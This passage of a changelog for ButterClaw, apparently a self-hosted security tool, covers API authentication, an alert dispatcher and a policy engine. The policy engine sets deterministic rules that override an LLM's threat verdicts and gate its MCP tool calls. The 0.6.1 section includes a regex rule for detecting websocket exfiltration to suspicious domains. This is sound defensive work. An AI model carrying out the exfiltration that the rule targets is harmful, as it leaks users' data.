| Isolation | Container sandbox | ProtectSystem=strict | None |
| Config via env | env_file | EnvironmentFile | .env file |

**Design Decisions:**

| Decision | Rationale |
|----------|-----------|
| Stdlib .env parser | No python-dotenv dependency — ~30 lines of stdlib replaces a third-party package |
| Env vars override .env | 12-factor app behavior — Docker/systemd env vars must always win |
| try/except ImportError for config | Backward compat — all modules still work without config.py present |
| Non-root Docker user | Container security hardening — minimal process permissions |
| /data volume for SQLite | Persistence survives container rebuilds and image upgrades |
| Nginx serves static HTML | Dashboard served by nginx directly; only /api/ proxied to Flask |
| SSE-specific proxy config | SSE requires proxy_buffering off + 24h timeout or streams break |
| systemd ProtectSystem=strict | Filesystem hardening — only the working directory is writable |
| SQLite .backup in backup script | cp on a live SQLite DB risks journal corruption — .backup is atomic |
| Keep last 7 backups | Prevents disk fill on cron-scheduled backups |
| BUTTERCLAW_ prefix on all vars | Namespace isolation — no collision with system environment variables |
| GPU passthrough conditional | Ollama uses GPU if nvidia-container-toolkit available; CPU fallback is automatic |
| requirements.txt with ranges | Pin major version, allow patch updates — e.g., flask>=3.0,<4.0 |
| BASE_DIR preserved in modules | alert_dispatcher.py diagnostic mode and buttervault.py keyring ops need it |

**Impact Summary:**
- ~748 lines added, ~77 lines modified across all files
- 12 new files, 7 modified files
- 0 new pip dependencies (formalizes 3 existing in requirements.txt)
- 0 new SQLite tables
- 2 new/enhanced API endpoints (enhanced /api/health + new /api/config)
- 43 total API routes (41 from v0.6.2 + enhanced health + new config)

---

## [0.6.2] - The Exoskeleton: Alert Dispatcher - 2026-05-01

### Added
- **Alert Dispatcher Module (`alert_dispatcher.py`):** New standalone module (~1,566 lines) providing external push notifications when critical events occur. Pushes to 5 channel types: webhook (generic HTTP POST with HMAC-SHA256 signing), Discord (rich embeds), ntfy (push notifications), SMTP email, and Gotify (self-hosted push). Zero new pip dependencies — built entirely on stdlib (`urllib.request`, `smtplib`, `hmac`, `hashlib`).
- **9 Alert Event Types (`alert_dispatcher.py`):** Complete coverage of every critical system event:
  - `verdict_critical` — Brain or Policy returned CRITICAL verdict
  - `verdict_warning` — Brain returned WARNING verdict (≥ 50% confidence)
  - `gibson_triggered` — Automatic Gibson from ChainExecutor critical path
  - `gibson_manual` — Manual Gibson via `/api/rotate-keys`
  - `policy_override` — Policy Engine overrode Brain verdict (pre-brain or post-brain)
  - `policy_blocked` — Policy Engine blocked a request or skipped a tool
  - `auth_brute_force` — 5+ auth failures from one IP within 60 seconds
  - `mcp_offline` — MCP child process health check detected alive→dead transition
  - `system_startup` — ButterClaw server started successfully
- **Channel CRUD (`alert_dispatcher.py`):** `create_channel()`, `get_channel()`, `list_channels()`, `update_channel()`, `delete_channel()`, `toggle_channel()`. Full config validation per channel type — required fields enforced (e.g., webhook requires `url`, smtp requires `host`, `port`, `from_addr`, `to_addr`). Cascade delete removes all rules and history when a channel is deleted.
- **Rule-Based Event Routing (`alert_dispatcher.py`):** `create_rule()`, `get_rule()`, `list_rules()`, `update_rule()`, `delete_rule()`, `toggle_rule()`. Each rule maps one event type to one channel with a configurable cooldown (default 60s, 0 = no cooldown). Per-rule cooldown — same channel can have different cooldowns for different event types.
- **Core Dispatch Engine (`alert_dispatcher.py`):** `dispatch_alert(event_type, context)` — main entry point called from server.py at each integration hook. Finds all enabled rules matching the event type, spawns `_dispatch_worker()` in a daemon thread for non-blocking delivery. `analyze_threat()` returns immediately while alerts fire in the background.
- **Retry with Exponential Backoff (`alert_dispatcher.py`):** Failed deliveries retry with exponential backoff (1s → 2s → 4s, max 3 attempts). Each attempt logged to `alert_history` with response code and error message. Final status: `sent`, `failed`, or `retry_exhausted`.
- **HMAC-SHA256 Webhook Signing (`alert_dispatcher.py`):** Every outbound webhook payload is signed with a per-channel signing secret. Headers: `X-ButterClaw-Signature: sha256=<hex>`, `X-ButterClaw-Event: <event_type>`, `X-ButterClaw-Timestamp: <ISO8601>`. Same pattern as GitHub webhooks — receivers can verify payload authenticity.
- **Per-Channel Payload Formatting (`alert_dispatcher.py`):** `_format_payload()` builds channel-appropriate payloads:
  - `webhook` — JSON with event_type, timestamp, severity, context, instance_id
  - `discord` — Rich embed with color-coded severity sidebar (red=critical, amber=warning, emerald=info), structured fields, footer with version
  - `ntfy` — Title + body + priority mapping (critical=5/urgent, warning=3/default, info=2/low) + tags
  - `smtp` — Subject line with severity emoji + plain-text body with structured fields
  - `gotify` — Title + message + priority (critical=8, warning=5, info=2)
- **Alert History Audit Log (`alert_dispatcher.py`):** `alert_history` table records every dispatch attempt with timestamp, rule_id, channel_id, event_type, status, response_code, error_message, payload_preview (200 chars), and attempt_count. Queryable via `get_alert_history()` with filters for channel_id, event_type, status, since, and limit. `get_alert_history_count()` for totals.
- **Auth Brute-Force Detection (`alert_dispatcher.py`):** `track_auth_failure(ip_address)` tracks 401/403 responses per IP using a thread-safe in-memory sliding window (`collections.deque`). Fires `auth_brute_force` alert when 5 failures from the same IP occur within 60 seconds. Called from server.py via `@after_request` hook.
- **Test Alert (`alert_dispatcher.py`):** `send_test_alert(channel_id)` sends a test notification to any configured channel on demand. Returns delivery result with status, response code, and error message if failed.
- **Cooldown Engine (`alert_dispatcher.py`):** `_is_cooled_down(rule_id, cooldown_secs)` checks `alert_history` for the last successful dispatch within the cooldown window. Prevents alert storms during sustained attacks. Status logged as `cooldown` in history.
- **3 New SQLite Tables (`alert_dispatcher.py`):** All in shared `butterclaw.db`:
  - `alert_channels` — channel_id, name, channel_type, config (JSON), signing_secret, enabled, created_at, last_used, last_status
  - `alert_rules` — rule_id, name, event_type, channel_id (FK), cooldown_secs, enabled, created_at
  - `alert_history` — history_id, rule_id, channel_id, event_type, status, response_code, error_message, payload_preview, attempt_count, created_at
- **13 Alert API Endpoints (`alert_dispatcher.py`):** Registered via `register_alert_routes(app)`:
  - `GET /api/alerts/channels` (viewer) — List all alert channels
  - `POST /api/alerts/channels` (admin) — Create a new channel with config validation
  - `PUT /api/alerts/channels/<id>` (admin) — Update channel config
  - `DELETE /api/alerts/channels/<id>` (admin) — Delete channel (cascades rules + history)
  - `POST /api/alerts/channels/<id>/toggle` (admin) — Enable/disable channel
  - `POST /api/alerts/channels/<id>/test` (operator) — Send test alert to channel
  - `GET /api/alerts/rules` (viewer) — List all rules (filter: event_type, channel_id)
  - `POST /api/alerts/rules` (admin) — Create a new rule
  - `PUT /api/alerts/rules/<id>` (admin) — Update a rule
  - `DELETE /api/alerts/rules/<id>` (admin) — Delete a rule
  - `POST /api/alerts/rules/<id>/toggle` (admin) — Enable/disable rule
  - `GET /api/alerts/history` (viewer) — Query history (filters: channel_id, event_type, status, since, limit)
  - `GET /api/alerts/status` (viewer) — Summary: total channels, active rules, recent dispatches, last alert timestamp
- **14-Step Diagnostic Suite (`alert_dispatcher.py`):** Standalone self-test when run as `python alert_dispatcher.py`: DB init, channel CRUD (5 types), channel validation, channel toggle, rule CRUD, rule validation, rule toggle, webhook signing verification, cooldown enforcement, auth failure tracking (threshold detection), payload formatting (all 5 types), alert history logging, dispatch path (dry run with expected failure), cascade delete cleanup.
- **MCP Health Monitor (`server.py`):** New `mcp_health_monitor()` daemon thread polls MCP process health every 10 seconds. Uses `was_alive` state tracking — dispatches `mcp_offline` only on alive→dead transition (not on persistent-dead, preventing alert storms). Auto-started at module load.
- **Auth Failure Tracking Hook (`server.py`):** `@after_request` decorator on all responses — calls `alert_dispatcher.track_auth_failure(request.remote_addr)` on every 401/403 response. Catches both API key failures and session token failures in one place.
- **Alert Dispatcher UI (`routing.html`):** New full-width section after Policy Engine with:
  - Channel cards — name, type badge (color-coded: webhook=blue, discord=indigo, ntfy=emerald, smtp=amber, gotify=violet), enabled/disabled toggle, last used timestamp, last status badge, config preview (truncated URL — never secrets), Test/Edit/Delete buttons
  - Rule rows — event type label, arrow, channel name, cooldown display, toggle/delete controls
  - Alert history timeline — time-relative timestamps, color-coded status badges (sent=emerald, failed=red, cooldown=amber, retry_exhausted=rose), event type + channel name, event/status filter dropdowns, Load More pagination
  - Channel create/edit modal with dynamic config fields per channel type, signing secret input (webhook only)
  - Rule create modal with event type selector, channel dropdown (populated from enabled channels), cooldown input
  - Status summary bar (channel count, rule count, last alert timestamp)
  - Info box explaining Alert Dispatcher design decisions
- **Alert Dispatch Badge (`index.html`):** Oopsie cards now show a 🔔 "Alert Sent" badge when `alert_dispatched` is true in the SSE payload. Links to routing.html#alertDispatcherSection.
- **Sidebar Nav Links:** 🔔 Alert Dispatcher link added to both `routing.html` (internal anchor) and `index.html` (cross-page link to routing.html#alertDispatcherSection).
- **Tailwind Safelist:** Added indigo color classes (`bg-indigo-50`, `bg-indigo-100`, `border-indigo-200`, `text-indigo-600`) to both files for Discord channel badges.

### Changed
- **Alert Dispatcher Import Guard (`server.py`):** `try: import alert_dispatcher` with `ALERT_DISPATCHER_ENABLED` flag. Graceful degradation — `dispatch_alert()` and `track_auth_failure()` become no-ops when module is not present. All 13 endpoints return 503 when disabled.
- **Route Registration (`server.py`):** `register_alert_routes(app)` called after `register_auth_routes(app)` when `ALERT_DISPATCHER_ENABLED` is True.
- **init_db() (`server.py`):** Now calls `alert_dispatcher.init_alert_db()` after `policy_engine.init_policy_db()` when dispatcher is enabled. Creates 3 new tables.
- **Boot Banner (`server.py`):** Now shows `Alert Dispatcher: ENABLED/DISABLED` alongside Auth and Policy Engine status. `system_startup` alert dispatched after `bootstrap_admin_key()` with version, routing mode, and model name.
- **Verdict Dispatch Hooks (`server.py`):** `dispatch_alert("verdict_critical", ...)` and `dispatch_alert("verdict_warning", ...)` called after final verdict determination in `analyze_threat()`. Context includes payload preview (500 chars), verdict, confidence, primary gate, reasoning preview, source IP, and policy action if applicable.
- **Policy Override/Block Dispatch Hooks (`server.py`):** At each `evaluate_policies()` call site (pre-brain, post-brain, ChainExecutor pre-tool), non-"allow" policy results trigger `dispatch_alert("policy_override", ...)` or `dispatch_alert("policy_blocked", ...)` with scope, policy name, action, original/final verdict, and payload preview.
- **Gibson Alert-Then-Burn Ordering (`server.py`):** All 3 Gibson paths (chain auto, hardcoded fallback, manual rotation) now dispatch the alert BEFORE calling `buttervault.butter_keys()`. Timeline: alert goes out → HTTP requests fire → vault destroyed → auth destroyed → operator receives notification.
- **SSE Oopsie Payload (`server.py`):** Added `alert_dispatched: true` flag when `dispatch_alert()` was called for a verdict. Frontend uses this for the oopsie card badge — no alert content or channel details leak to the frontend.
- **MCP Health Monitoring (`server.py`):** Replaced passive error handling with active health monitor daemon thread. 10-second polling interval with state-transition detection (alive→dead only).
- **Version Bumps:** `VERSION = "0.6.2"` in server.py. 6 version string updates in `routing.html` (sidebar, MCP badges ×3, MCP info box, auth modal). 1 version string update in `index.html` (auth modal footer).
- **Hash-Based Scroll (`routing.html`):** Added `#alertDispatcherSection` handler.
- **Init Sequence (`routing.html`):** `fetchAlertStatus()`, `fetchChannels()`, `fetchRules()`, `fetchAlertHistory()` called after `fetchPolicies()` on session validation.

### Architecture Notes

**Channel Secrets — Why They Live Outside the ButterVault:**

The primary purpose of the Alert Dispatcher is to notify the operator when something catastrophic happens. If Gibson fires and also destroys the ability to notify, that defeats the purpose. Channel secrets (webhook URLs, SMTP passwords, Discord webhook URLs, Gotify tokens) are stored in the `alert_channels` SQLite table, NOT in the ButterVault.

```
Gibson Timeline:
1. dispatch_alert("gibson_triggered", {...})   ← alert goes out over HTTP
2. _dispatch_worker sends to all channels      ← webhook/discord/ntfy/smtp/gotify fire
3. buttervault.butter_keys()                   ← vault destroyed (API keys, OAuth tokens)
4. auth.destroy_all_api_keys()                 ← auth destroyed (sessions invalidated)
5. Operator receives notification              ← Discord ping / email / push arrives
```

If the operator wants to manually purge channel secrets post-Gibson, they can delete channels via the API after re-bootstrapping auth.

**What Survives Gibson (v0.6.2):**

```
DESTROYED by Gibson:           SURVIVES Gibson:
├── vault table (API keys)     ├── policies table (rules are config)
├── oauth_tokens table         ├── policy_events table (audit trail)
├── api_keys table             ├── alert_channels table (delivery config)
├── session cache              ├── alert_rules table (routing config)
└── OS keyring master key      ├── alert_history table (audit trail)
                               ├── mcp_events table (execution ledger)
                               └── logs table (oopsie log)
```

**Dispatch Architecture:**

```
server.py hook point
    │
    ▼
dispatch_alert(event_type, context)     ← main thread (non-blocking)
    │
    ├── find matching enabled rules
    ├── spawn daemon thread
    │       │
    │       ▼
    │   _dispatch_worker()              ← background thread
    │       │
    │       ├── for each rule:
    │       │   ├── check cooldown      → skip if within window
    │       │   ├── resolve channel     → get config + type
    │       │   ├── format payload      → channel-specific format
    │       │   ├── sign payload        → HMAC-SHA256 (webhook only)
    │       │   ├── deliver             → HTTP POST / SMTP
    │       │   │   └── retry on fail   → 1s, 2s, 4s (max 3)
    │       │   └── log to history      → status + response code
    │       └── update channel last_used / last_status
    │
    └── return immediately              ← analyze_threat() continues
```

**API Surface (v0.6.2):** 41 total routes

| Category | Count | Auth Tiers |
|----------|-------|------------|
| Auth (v0.6.0) | 7 | admin, operator |
| Core (v0.5.x) | 6 | operator, viewer, admin, public |
| MCP (v0.5.0) | 7 | admin, operator, viewer |
| Vault/OAuth (v0.5.x) | 6 | admin, operator, viewer, public |
| Policy (v0.6.1) | 8 | admin, operator, viewer |
| **Alert (v0.6.2)** | **13** | **admin, operator, viewer** |

**Design Decisions:**

| Decision | Rationale |
|----------|-----------|
| Channel secrets outside ButterVault | Gibson alert must fire before vault destruction |
| Dispatch in daemon thread | Non-blocking — analyze_threat() returns immediately |
| Per-rule cooldown, not per-channel | Same channel can have different cooldowns for different events |
| HMAC-SHA256 webhook signing | Same pattern as GitHub webhooks — receivers verify authenticity |
| Zero new pip dependencies | urllib.request for HTTP, smtplib for email, hmac for signing |
| Retry with exponential backoff | 1s → 2s → 4s handles transient network failures |
| 10s delivery timeout | Prevents slow receivers from blocking dispatch thread |
| alert_dispatched flag in SSE | Frontend knows alert went out without leaking content |
| @after_request for auth tracking | Catches both API key and session failures in one place |
| Cascade delete on channel removal | Prevents orphaned rules/history |
| State-transition MCP monitoring | Only fires on alive→dead, not persistent-dead |

---

## [0.6.1] - The Exoskeleton: Policy Engine - 2026-05-01

### Added
- **Policy Engine Module (`policy_engine.py`):** New standalone module (~350 lines) providing deterministic guardrails for the probabilistic Brain. Implements the DRIFT framework pattern (NeurIPS 2025) — a Dynamic Validator that constrains the Brain's probabilistic reasoning with deterministic rules. Zero new pip dependencies — built entirely on stdlib.
- **3-Scope Filter Pipeline (`policy_engine.py`):** Policies evaluate at three distinct points in the analysis pipeline:
  - `pre_brain` — Pattern-match known-bad/known-good payloads before the Brain. Can short-circuit to CRITICAL or BENIGN without burning inference time.
  - `post_brain` — Validate the Brain's verdict after reasoning. Can override, escalate, downgrade, or require higher confidence.
  - `pre_tool` — Gate individual MCP tool calls inside ChainExecutor. Per-tool allowlist/blocklist.
- **16 Safe Condition Operators (`policy_engine.py`):** Extends ChainExecutor's whitelist operator pattern with: `contains`, `not_contains`, `equals`, `not_equals`, `starts_with`, `ends_with`, `regex_match`, `greater_than`, `less_than`, `greater_equal`, `less_equal`, `in_list`, `not_in_list`, `length_gt`, `length_lt`. All use whitelist dispatch — no `eval()`.
- **Scope-Aware Field Resolvers (`policy_engine.py`):** Each scope provides context-appropriate fields for condition matching:
  - `pre_brain`: 6 fields — `payload`, `threat_type`, `payload_length`, `source_ip`, `hour_of_day`, `day_of_week`
  - `post_brain`: +5 fields — `verdict`, `confidence`, `primary_gate`, `reasoning`, `has_chain`
  - `pre_tool`: +3 fields — `tool_name`, `tool_args`, `chain_step`
- **Policy CRUD (`policy_engine.py`):** `create_policy()`, `get_policy()`, `list_policies()`, `update_policy()`, `delete_policy()`, `toggle_policy()`. Full validation on every write — scope-action compatibility (e.g., `skip_tool` only valid for `pre_tool`, `require_confidence` only valid for `post_brain`), regex compile check at creation time, numeric value validation for comparison operators, `action_params` validation for `require_confidence`.
- **Policy Events Audit Log (`policy_engine.py`):** `policy_events` table records every policy match with timestamp, policy_id, scope, action taken, original verdict, final verdict, payload preview (200 chars), tool name, and chain_id. Queryable via `get_policy_events()` with filters for policy_id, scope, since, and limit. `get_policy_event_count()` for totals.
- **Core Evaluator (`policy_engine.py`):** `evaluate_policies(scope, context)` — loads enabled policies for the given scope in priority order (ascending), evaluates each condition against the context using safe operators. First non-"allow" match wins (short-circuit). "allow" policies are logged but do not stop evaluation. Returns action, policy_id, policy_name, reason, policies_checked, and policies_matched.
- **Dry-Run Testing (`policy_engine.py`):** `test_payload(payload, threat_type)` — evaluates a payload against all 3 scopes without logging events or incrementing hit counters. Simulates Brain output for post_brain testing and tool calls for pre_tool testing.
- **Async Hit Counter (`policy_engine.py`):** `_increment_hit_count()` fires a daemon thread for non-blocking counter updates — never blocks the evaluation hot path.
- **12-Step Diagnostic Suite (`policy_engine.py`):** Self-test via `python policy_engine.py`. Tests: DB init, create (3 scopes), evaluate match/no-match, priority ordering, disabled skip, allow passthrough, unknown operator safety, dry-run, event logging, CRUD (update/toggle/delete), cleanup.
- **New SQLite Tables:** 2 tables added to `butterclaw.db`:
  - `policies` — `id`, `name`, `description`, `priority`, `enabled`, `scope`, `condition` (JSON), `action`, `action_params` (JSON), `created_by`, `created_at`, `updated_at`, `hit_count`
  - `policy_events` — `id`, `timestamp`, `policy_id`, `policy_name`, `scope`, `action_taken`, `original_verdict`, `final_verdict`, `payload_preview`, `tool_name`, `chain_id`
- **8 New API Endpoints (`server.py`):** Policy management endpoints registered with auth decorators:
  - `GET /api/policies` (viewer) — List all policies with optional `?scope=` and `?enabled=` filters.
  - `POST /api/policies` (admin) — Create a new policy rule. Validates required fields, passes `created_by` from `request.auth_context`.
  - `GET /api/policies/<id>` (viewer) — Fetch a single policy by ID.
  - `PUT /api/policies/<id>` (admin) — Update a policy rule.
  - `DELETE /api/policies/<id>` (admin) — Permanently delete a policy.
  - `POST /api/policies/<id>/toggle` (admin) — Enable/disable without deleting.
  - `POST /api/policies/test` (operator) — Dry-run a payload against all policies.
  - `GET /api/policies/events` (viewer) — Query policy event audit log with `?limit=`, `?policy_id=`, `?scope=`, `?since=` filters. Returns events, count, and total.
- **Policy Management UI (`routing.html`):** Full policy engine panel below the Event Ledger section:
  - Policy card list with priority badges, scope-colored badges (emerald=pre_brain, violet=post_brain, amber=pre_tool), action badges, condition previews, hit counts, and inline Toggle/Edit/Delete controls.
  - Scope and status filter dropdowns with auto-refresh on change.
  - Create/Edit modal with dynamic field dropdown (updates based on selected scope), all 15 operators, scope-action compatibility hints (disables incompatible actions), conditional confidence input for `require_confidence` action.
  - Dry-run test panel with payload textarea, threat type selector, 3-column results grid (Pre-Brain / Post-Brain / Pre-Tool), and expandable match details.
  - Info box documenting the DRIFT framework pattern and evaluation semantics.
  - `#policyEngineSection` hash anchor for cross-page deep linking.
- **Policy Override Badge (`index.html`):** Oopsie cards now display a 🛡️ badge when a verdict was influenced by a policy. Four badge variants: "Policy Override" (pre-brain/post-brain escalation), "Policy Fast-Track" (pre-brain benign), "Confidence Gate" (post-brain confidence threshold), "Policy Applied" (generic fallback). Each badge links to `routing.html#policyEngineSection`.
- **Sidebar Nav Links:** Both `index.html` and `routing.html` now include a 🛡️ Policy Engine nav link. Index links to `routing.html#policyEngineSection` (cross-page). Routing links to `#policyEngineSection` (same-page scroll).
- **Tailwind Safelist (`index.html`):** Added `rose` and `violet` color classes for policy badge rendering: `bg-rose-50`, `bg-rose-100`, `border-rose-200`, `text-rose-600`, `text-rose-700`, `bg-violet-50`, `bg-violet-100`, `border-violet-200`, `text-violet-500`, `text-violet-600`.

### Changed
- **Pre-Brain Filter Hook (`server.py`):** `analyze_threat()` now evaluates pre-brain policies before calling `ask_guardian_agent()`. Three outcomes: `override_critical` → skips Brain entirely with verdict=CRITICAL, confidence=1.0, gate=Policy; `override_benign` → skips Brain with verdict=BENIGN; `block` → returns 403 with policy reason. If no policy matches, Brain is called normally. Guarded by `POLICY_ENGINE_ENABLED` flag.
- **Post-Brain Validator Hook (`server.py`):** After the Brain returns a verdict but before the confidence threshold check, post-brain policies can: `override_critical` → escalate to CRITICAL; `override_benign` → downgrade to BENIGN; `require_confidence` → downgrade CRITICAL to WARNING if confidence is below the policy's `min_confidence` threshold. Policy annotations are appended to the `reasoning` field.
- **Pre-Tool Gate in ChainExecutor (`server.py`):** `_execute_step()` now evaluates pre-tool policies before each `mcp_manager.send()` call. `skip_tool` → logs `policy_blocked` status in the Event Ledger and skips the tool. `block` → hard block, tool skipped. Guarded by `POLICY_ENGINE_ENABLED`.
- **Pre-Tool Gate for Hardcoded gibson_kill (`server.py`):** The hardcoded fallback path (when no chain is present) now evaluates pre-tool policies before calling `execute_gibson_kill`. Uses `gibson_blocked` flag pattern — `buttervault.butter_keys()` still fires unconditionally (Sovereign Seal holds). Only the MCP tool call is gated.
- **Pre-Tool Gate for Hardcoded rotate_keys (`server.py`):** Same pattern as gibson_kill — `rotate_blocked` flag prevents the MCP `rotate_keys` call if policy blocks it.
- **Pre-Tool Gate in manual_key_rotation (`server.py`):** The manual Gibson trigger endpoint now evaluates pre-tool policies for `rotate_keys`. Vault destruction fires first (correct), only the MCP call is gated.
- **Policy Engine Import Guard (`server.py`):** `try: import policy_engine` with `except ImportError` sets `POLICY_ENGINE_ENABLED = False` and prints a warning. All policy hooks and endpoints are guarded by this flag — server.py works without policy_engine.py present (backward compat).
- **init_db() Updated (`server.py`):** Now calls `policy_engine.init_policy_db()` when `POLICY_ENGINE_ENABLED` is True. Creates `policies` and `policy_events` tables.
- **Boot Banner (`server.py`):** Now shows `Policy Engine: ENABLED` or `DISABLED` in the startup output. Handshake banner bumped to v0.6.1.
- **All 8 Policy Endpoints Graceful Degradation (`server.py`):** Return 503 with `{"error": "Policy engine not available"}` when `POLICY_ENGINE_ENABLED` is False.
- **Ledger Status Colors (`routing.html`):** Added `policy_blocked` status to `ledgerStatusColors`: `{ bg: 'bg-rose-100', text: 'text-rose-700', dot: 'bg-rose-500' }`.
- **Ledger Status Filter (`routing.html`):** Added `Skipped` and `Policy Blocked` options to the status dropdown.
- **Init Sequence (`routing.html`):** `fetchPolicies()` called after `renderGates()` and `setRoutingMode()` in the init function.
- **Hash-Based Scroll (`routing.html`):** Added `#policyEngineSection` handler alongside existing `#mcpSection` and `#eventLedgerSection`.
- **Version Bumps (`routing.html`):** 6 locations updated from v0.6.0 to v0.6.1 — sidebar footer, MCP Armed/Degraded/Offline badges, MCP Info Box, auth login modal footer.
- **Version Bump (`index.html`):** Auth login modal footer updated from v0.6.0 to v0.6.1.
- **Docstring + VERSION (`server.py`):** Updated to `ButterClaw v0.6.1 — The Exoskeleton (Policy Engine)`, `VERSION = "0.6.1"`.

### Architecture Notes

**Policy Evaluation Pipeline:**
```
Watcher → POST /api/analyze
                │
          ┌─────▼──────────┐
          │ 1. PRE-BRAIN   │ ← Policy Engine: pattern match, fast-track
          │    Filter      │    Can short-circuit to CRITICAL or BENIGN
          │                │    without burning inference time
          └─────┬──────────┘
                │ (if not short-circuited)
          ┌─────▼──────────┐
          │ 2. BRAIN       │ ← Gemma reasoning (unchanged)
          │    (Ollama)    │
          └─────┬──────────┘
                │
          ┌─────▼──────────┐
          │ 3. POST-BRAIN  │ ← Policy Engine: verdict validation
          │    Validator   │    Can override Brain's decision
          └─────┬──────────┘
                │
          ┌─────▼──────────┐
          │ 4. PRE-TOOL    │ ← Policy Engine: per-tool gate
          │    Gate        │    Runs before each MCP send()
          └─────┬──────────┘    inside ChainExecutor
                │
          ┌─────▼──────────┐
          │ 5. MCP Tool    │ ← ChainExecutor or hardcoded fallback
          │    Execution   │
          └────────────────┘
```

**Example Policy Rule:**
```json
{
  "name": "Block external websocket exfiltration",
  "scope": "pre_brain",
  "priority": 10,
  "condition": {
    "field": "payload",
    "operator": "regex_match",
    "value": "wss?://[^\\s]*\\.(net|io|xyz|tk|ml)"
  },
  "action": "override_critical",
  "description": "External websocket to suspicious TLD — pre-brain escalation"
}
```

**Gibson Interaction:**
```
butter_keys()
├── UPDATE vault SET ciphertext = garbage           ← Static API keys
├── UPDATE oauth_tokens SET ciphertext = garbage    ← OAuth payloads
├── auth.destroy_all_api_keys()                     ← API key hashes + sessions
└── policies table: UNTOUCHED                       ← Config survives Gibson
    policy_events table: UNTOUCHED                  ← Audit trail preserved
```

Policies survive Gibson. This is correct behavior — if the Gibson fires and destroys all credentials, you want the policies that triggered or detected the breach to still be there for the post-mortem audit. Policies are operational configuration, not sensitive data.

**Design Decisions:**

| Decision | Rationale |
|---|---|
| Single-condition rules | Compound AND/OR adds complexity for minimal v0.6.1 value — ship simple, extend later |
| Priority-based short-circuit | First non-"allow" match wins — predictable, debuggable |
| Policies survive Gibson | Config, not credentials — needed for post-mortem |
| `try: import policy_engine` | Backward compat — server.py works without policy_engine.py present |
| Regex via `re.search` not `re.match` | `search` finds patterns anywhere in the string — more intuitive for security rules |
| Separate `policy_events` table | Don't pollute `mcp_events` — different audit concern |
| Hit counter on daemon thread | Non-blocking — never slows the evaluation hot path |
| No `eval()` | Same safety principle as ChainExecutor — whitelist operators only |

**New Dependencies:** None. Zero new pip packages.

**New Files:** 1 (`policy_engine.py`)

**New SQLite Tables:** 2 (`policies`, `policy_events`)

**New API Endpoints:** 8

---

## [0.6.0] - The Exoskeleton: API Gateway & Authentication - 2026-04-18

### Added
- **Authentication Module (`auth.py`):** New standalone module (~890 lines) providing the complete API gateway for ButterClaw. Zero new pip dependencies — built entirely on stdlib (`hmac`, `hashlib`, `secrets`, `json`, `base64`).
- **API Key Manager (`auth.py`):** HMAC-SHA256 API key generation, hashing, and verification with per-key 16-byte random salts. Keys are hashed before storage — plaintext is shown exactly once at creation and never persists. Functions: `generate_api_key()`, `hash_api_key()`, `create_api_key()`, `verify_api_key()`, `revoke_api_key()`, `delete_api_key()`, `list_api_keys()`.
- **Role-Based Access Control (`auth.py`):** Three-tier role hierarchy — `admin` (full access), `operator` (analyze + read + settings), `viewer` (read-only: events, health, status). Follows the trust-tier pattern from the OWASP Agent Security Checklist.
- **Session Tokens (`auth.py`):** HMAC-SHA256 signed JSON tokens with 1-hour TTL, issued on dashboard login. Stored in `httpOnly` + `SameSite=Strict` cookies. No third-party JWT library. Session signing key derived from the ButterVault master key via HMAC domain separation — Gibson destruction automatically invalidates all active sessions.
- **@require_auth Decorator (`auth.py`):** Flask route decorator with 4-strategy auth chain: `Authorization: Bearer` header → `X-Session-Token` header → session cookie → query parameter (for SSE `EventSource` which cannot set custom headers). Returns structured 401/403 JSON errors. Injects `request.auth_context` with `key_id`, `role`, and `label` for downstream use.
- **Per-API-Key Rate Limiting (`auth.py`):** `is_rate_limited_for_key()` replaces the legacy IP-based rate limiter. Configurable thresholds per role tier: admin (30/min), operator (15/min), viewer (5/min). Sliding window implementation using `collections.deque`.
- **Auth API Endpoints (`auth.py`):** Seven new routes registered via `register_auth_routes(app)`:
  - `POST /api/auth/login` — Exchanges API key for session token. 0.1s delay on failure to prevent brute-force enumeration.
  - `POST /api/auth/logout` — Clears session cookie.
  - `GET /api/auth/whoami` — Returns current identity (role, label, key_id).
  - `GET /api/auth/keys` — Lists all API keys (admin only, hashes redacted).
  - `POST /api/auth/keys` — Creates a new API key with specified role and label. Privilege escalation blocked (operators cannot create admin keys).
  - `DELETE /api/auth/keys/<id>` — Revokes (disables) an API key. Self-revocation blocked to prevent lockout.
  - `DELETE /api/auth/keys/<id>/purge` — Permanently deletes an API key record.
- **Bootstrap CLI (`auth.py`):** `bootstrap_admin_key()` generates a first-run admin API key and prints it to the server terminal. Called automatically during server boot after `init_db()`.
- **New SQLite Table (`auth.py`):** `api_keys` table with `key_id`, `key_hash`, `salt`, `role`, `label`, `created_at`, `last_used`, `enabled` columns. Self-managed by auth.py — created on first connection.
- **Dashboard Login Modal (`index.html`, `routing.html`):** Full-screen login modal at `z-[200]` blocks all dashboard interaction until authenticated. API key input with `bc_...` placeholder, error feedback, animated transitions.
- **Auth Session Management JS (`index.html`, `routing.html`):** Shared auth module (~120 lines) providing:
  - `authFetch()` — Wraps `fetch()` with Bearer token injection and auto-redirect to login modal on 401/403.
  - `connectAuthSSE()` — Appends session token as query parameter for EventSource connections.
  - `checkSession()` — Validates token via `/api/auth/whoami` on page load.
  - `handleLogin()` / `handleLogout()` — Full login/logout lifecycle with localStorage session persistence.
  - `updateAuthUI()` — Role badge colors (admin=red, operator=amber, viewer=emerald) in sidebar.
- **Sidebar Auth Badge (`index.html`, `routing.html`):** Auth identity badge with role indicator, label text, and Logout button. Positioned above MCP/connection badges.
- **Auth Diagnostic Mode (`auth.py`):** 10-step self-test suite via `python auth.py`. Tests key generation, hashing, verification, session tokens, rate limiting, role hierarchy, and CRUD operations.

### Changed
- **Route Protection (`server.py`):** All 20 existing routes decorated with `@require_auth()` at appropriate role tiers. Public: `/api/health`, `/api/vault/oauth/callback`. Viewer: logs, status, events, stream. Operator: analyze, settings GET, ping, OAuth start. Admin: vault key, rotate-keys, shield, settings POST, MCP restart, OAuth revoke.
- **Settings Split (`server.py`):** `/api/settings` split into two functions — GET requires `operator`, POST requires `admin`. Operators can read settings but only admins can modify.
- **Per-Key Rate Limiter (`server.py`):** `analyze_threat()` now uses `is_rate_limited_for_key(ctx["key_id"], ctx["role"])` instead of the legacy IP-based rate limiter. Error messages show the per-role limit.
- **Gibson Auth Hook (`buttervault.py`):** `butter_keys()` now calls `auth.destroy_all_api_keys()` after vault destruction. Uses `try/except ImportError` for backward compatibility with pre-v0.6.0 deployments.
- **authFetch Wrapping (`index.html`):** 12 `fetch()` calls wrapped with `authFetch()` — paranoia init/save, shield toggle, vault status/key, OAuth start/revoke/status, rotate-keys, logs, simulate attack, MCP status.
